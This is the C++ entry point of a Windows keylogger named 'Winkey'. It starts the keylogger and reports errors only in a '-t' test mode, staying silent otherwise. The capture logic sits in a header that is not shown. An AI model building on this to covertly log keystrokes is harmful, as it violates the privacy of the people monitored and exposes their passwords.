#include "Winkey.hpp"
#include <memory>

/*
 * Check if the test mode has been set.
 * The test mode outputs the key log as a single string,
 * making it easier to compare the log with the expected results.
 */

static bool isTestModeSet(int argc, wchar_t *argv[])
{
    if (argc > 1 && argv[1][0] == L'-')
    {
        if (argv[1][1] == L't')
            return true;
        else
        {
            std::wcerr << L"Error: Unknown argument.\n";
            exit(1);
        }
    }
    return false;
}

int wmain(int argc, wchar_t *argv[])
{
    bool isTestMode = isTestModeSet(argc, argv);

    try {
        auto w = std::make_unique<Winkey>(); // RAII

        // Run the keylogger
        w->run(isTestMode);
    }
    catch (const WinkeyException &e)
    {
        if (isTestMode) // Output errors only while testing
            std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    catch (const std::exception &e)
    {
        if (isTestMode)
            std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
